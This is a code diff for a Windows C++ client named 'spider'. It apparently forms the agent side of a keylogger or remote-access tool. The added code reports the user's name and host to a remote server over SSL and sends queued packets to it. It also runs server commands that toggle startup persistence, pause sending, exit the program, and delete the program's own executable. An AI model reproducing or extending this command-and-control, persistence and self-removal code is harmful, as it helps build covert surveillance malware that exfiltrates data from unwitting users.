@@ -1,9 +1,11 @@
 #include <iostream>
 #include <boost/thread.hpp>
+#include <boost/filesystem.hpp>
 #include <boost/date_time/posix_time/posix_time.hpp>
 #include "reseau/Network.hh"
 #include "paquetFirstClient.hh"
 #include "paquetCommandServer.hh"
+#include "paquetCommandClient.hh"
 
 #ifndef CERTIFICATE_FILE
 # define CERTIFICATE_FILE ("client.crt")
@@ -12,6 +14,8 @@
 Network::Network(const std::string& port, const std::string& ip, Packager* packager) :
 	_port(port), _ip(ip), _ctx(boost::asio::ssl::context::sslv23), _packager(packager)
 {
+	_pause = 0;
+
 	boost::asio::ip::tcp::resolver resolver(_ios);
 	boost::asio::ip::tcp::resolver::query query(ip, port);
 	_iterator = resolver.resolve(query);
@@ -19,6 +23,14 @@ Network::Network(const std::string& port, const std::string& ip, Packager* packa
 	_ctx.load_verify_file(CERTIFICATE_FILE);
 	_ctx.set_verify_mode(boost::asio::ssl::context::verify_peer);
 	_engine = new SslEngine(_ios, _ctx);
+
+	_response[3] = [this](boost::asio::yield_context yield) {};
+	_response[4] = [this](boost::asio::yield_context yield) { spider_switchStartup(*this, yield); };
+	_response[5] = [this](boost::asio::yield_context yield) { spider_switchStartup(*this, yield); };
+	_response[6] = [this](boost::asio::yield_context yield) { spider_exit(*this, yield); };
+	_response[7] = [this](boost::asio::yield_context yield) { spider_pause(*this, yield); };
+	_response[8] = [this](boost::asio::yield_context yield) { spider_remove(*this, yield); };
+
 }
 
 
@@ -30,20 +42,18 @@ void Network::initNetwork() {
 		boost::asio::ip::tcp::endpoint endpoint = *_iterator;
 		boost::system::error_code ec;
 
-	    for (;;) {
-			std::cout << "Try to connect to the server" << std::endl;
-			_engine->getSocket().async_connect(endpoint, yield[ec]);
-		  if (!ec) {
-			  std::cout << "SSL: initializing HandShake" << std::endl;
-			  _engine->doHandshake(boost::asio::ssl::stream_base::client, yield);
-			  if (!ec) {
-				sendFirstPaquet(yield);
-			  }
-
-		  }
-		  _engine->getSocket().close();
-		}
-	  });
+		for (;;) {
+				std::cout << "Try to connect to the server" << std::endl;
+				_engine->getSocket().async_connect(endpoint, yield[ec]);
+				if (!ec) {
+					std::cout << "SSL: initializing HandShake" << std::endl;
+					_engine->doHandshake(boost::asio::ssl::stream_base::client, yield);
+					if (!ec) {
+						sendFirstPaquet(yield);
+					}
+				}
+				_engine->getSocket().close();
+		}});
 	_ios.run();
 }
 
@@ -51,12 +61,16 @@ void Network::sendFirstPaquet(boost::asio::yield_context yield)
 {
 	PaquetFirstClient	paquet;
 
-	std::cout << "test" << std::endl;
+
+	DWORD	size = 128;
+	char hostName[128];
+	char username[128];
+
+	GetUserNameA(username, &size);
+	gethostname(hostName, sizeof(hostName));
 
 	paquet.setVersion(1);
-	char hostName[128];
-	gethostname(hostName, sizeof(hostName));
-	paquet.setName(hostName);
+	paquet.setName(std::string(username) + "@" + std::string(hostName));
 	paquet.setDate(SelfUtils::secondsSinceEpoch());
 	paquet.createPaquet();
 
@@ -73,7 +87,7 @@ void Network::sendFirstPaquet(boost::asio::yield_context yield)
 	}
 	std::cout << "SSL: server RET value " << (int)ret << std::endl;
 	if (ret == 2) {
-		boost::thread readThread(&Network::readLoop, this);
+		boost::thread readThread(&Network::readLoop, this, yield);
 		writeLoop(yield);
 		readThread.join();
 	}
@@ -90,21 +104,96 @@ void Network::writeLoop(boost::asio::yield_context yield)
 		_packager->isLeft();
 		std::cout << "Packager OK" << std::endl;
 		Paquet *paquet = _packager->getPaquet();
-		std::cout << "SENDING PAQUET: " << *paquet << std::endl;
-		if (_engine->writePaquet(*paquet, yield) == -1) {
-			return;
-		}
+			if (_pause == 0) {
+				std::cout << "SENDING PAQUET: " << *paquet << std::endl;
+				if (_engine->writePaquet(*paquet, yield) == -1) {
+					return;
+				}
+			}
 		_packager->supprPaquet();
 	}
 }
 
-void Network::readLoop()
+void Network::readLoop(boost::asio::yield_context yield)
 {
 	PaquetCommandServer paquet;
 
 	while (!_engine->read(paquet)) {
-		if (paquet.getReponse() == 6)
-			exit(EXIT_SUCCESS);
+		if (_response.count(paquet.getReponse()) > 0)
+		// if (paquet.getReponse() >= 4 && paquet.getReponse() <= 8)
+			_response[paquet.getReponse()](yield);
+		else
+		{
+			PaquetCommandClient *paquet = new PaquetCommandClient();
+			paquet->setOk(0);
+			paquet->createPaquet();
+			_engine->writePaquet(*paquet, yield);
+		}
 		std::cout << "Paquet recu: " << paquet << std::endl;
 	}
+}
+
+void Network::spider_switchStartup(Network &net, boost::asio::yield_context yield)
+{
+	PaquetCommandClient *paquet = new PaquetCommandClient();
+
+	paquet->setOk(1);
+	if (_startup.isStartup()) {
+		_startup.delStartup();
+		if (_startup.isStartup()) {
+			paquet->setOk(0);
+		}
+	}
+	else {
+		_startup.addStartup();
+		if (!_startup.isStartup()) {
+			paquet->setOk(0);
+		}
+	}
+	paquet->createPaquet();
+	net.getEngine().writePaquet(*paquet, yield);
+}
+
+void Network::spider_exit(Network& net, boost::asio::yield_context yield) {
+	PaquetCommandClient *paquet = new PaquetCommandClient();
+
+	paquet->setOk(1);
+	std::cout << "Exit spider" << std::endl;
+	paquet->createPaquet();
+	net.getEngine().writePaquet(*paquet, yield);
+	exit(EXIT_SUCCESS);
+}
+
+void Network::spider_remove(Network& net, boost::asio::yield_context yield) {
+	PaquetCommandClient *paquet = new PaquetCommandClient();
+	HMODULE		hModule = GetModuleHandle(NULL);
+
+	if (hModule)
+	{
+		WCHAR	path[MAX_PATH];
+
+		paquet->setOk(1);
+		GetModuleFileName(hModule, path, MAX_PATH);
+		std::wstring wpath = path;
+		std::string str(wpath.begin(), wpath.end());
+		std::cout << "Remove: " << str << std::endl;
+		if (boost::filesystem::exists(str))
+			boost::filesystem::remove(str);
+	}
+	else
+		paquet->setOk(0);
+	paquet->createPaquet();
+	net.getEngine().writePaquet(*paquet, yield);
+}
+
+void Network::spider_pause(Network& net, boost::asio::yield_context yield) {
+	PaquetCommandClient *paquet = new PaquetCommandClient();
+
+	paquet->setOk(1);
+	if (net.getPause() == 0)
+		net.setPause(1);
+	else
+		net.setPause(0);
+	paquet->createPaquet();
+	net.getEngine().writePaquet(*paquet, yield);
 }
